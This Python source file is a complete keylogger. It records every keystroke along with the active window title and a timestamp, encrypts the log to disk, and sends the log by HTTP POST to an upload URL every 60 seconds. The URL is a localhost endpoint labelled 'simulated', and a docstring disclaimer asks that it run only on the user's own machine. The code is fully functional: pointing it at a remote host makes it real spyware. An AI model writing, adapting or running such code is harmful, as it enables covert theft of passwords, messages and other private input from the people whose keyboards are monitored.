"""
Keylogger with encrypted local storage + simulated exfiltration.
SAFE USE: Run only on your OWN test machine/VM. Do NOT deploy on other people's machines.
"""

import os
import time
import base64
import threading
from datetime import datetime
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import requests

# -------- CONFIG --------
LOG_FILE_ENC = "logs.enc"      # encrypted log storage
KEY_FILE = "secret.key"        # symmetric key file
EXFIL_URL = "http://127.0.0.1:5000/upload"  # simulated remote server
EXFIL_INTERVAL = 60           # seconds between exfil attempts
KILL_FILE = "kill.signal"     # drop this file to stop the logger (safe kill switch)
# ------------------------

# generate or load key
def load_or_create_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

FERNET = Fernet(load_or_create_key())

# helper: encrypt and append to file
def append_encrypted_text(text: str):
    # text is plain unicode, convert to bytes then encrypt
    data = text.encode("utf-8")
    token = FERNET.encrypt(data)  # bytes
    # store base64 to keep file text-friendly
    with open(LOG_FILE_ENC, "ab") as f:
        f.write(base64.urlsafe_b64encode(token) + b"\n")

# optional: get active window title (Windows version), else fallback
def get_active_window_title():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        title = buff.value
        return title if title else "Unknown"
    except Exception:
        return "Unknown"

# formatting function for keys
def format_key(key):
    try:
        s = str(key).replace("'", "")
        if s == "Key.space":
            return " "
        if s == "Key.enter":
            return "[ENTER]\n"
        if s.startswith("Key."):
            return f"[{s.replace('Key.', '').upper()}]"
        return s
    except Exception:
        return ""

# write a log line (plaintext) and encrypt it to file
def log_key(key):
    if os.path.exists(KILL_FILE):
        # safe stop if kill file present
        raise KeyboardInterrupt

    ts = datetime.utcnow().isoformat() + "Z"  # UTC timestamp
    active_win = get_active_window_title()
    content = f"{ts} | {active_win} | {format_key(key)}"
    # append as encrypted line
    append_encrypted_text(content)

# Listener callback
def on_press(key):
    try:
        log_key(key)
    except KeyboardInterrupt:
        return False
    except Exception:
        # ignore minor errors
        pass

# Exfiltration thread: periodically read enc file and POST to server
def exfiltration_worker():
    while True:
        if os.path.exists(KILL_FILE):
            break
        try:
            if os.path.exists(LOG_FILE_ENC):
                with open(LOG_FILE_ENC, "rb") as f:
                    payload = f.read()
                # POST the file content as base64
                resp = requests.post(EXFIL_URL, data={"file": base64.b64encode(payload).decode()})
                # on success from server, you may (optionally) truncate the file to avoid re-sending
                if resp.status_code == 200:
                    # rotate: rename old file with timestamp
                    ts = datetime.utcnow().strftime("%Y%m%d%H%M%S")
                    os.rename(LOG_FILE_ENC, f"logs.{ts}.enc")
        except Exception:
            pass
        time.sleep(EXFIL_INTERVAL)

# main
def main():
    print("Keylogger started. Press Ctrl+C to stop (or create kill.signal).")
    exf = threading.Thread(target=exfiltration_worker, daemon=True)
    exf.start()

    with Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Stopping keylogger...")

if __name__ == "__main__":
    main()
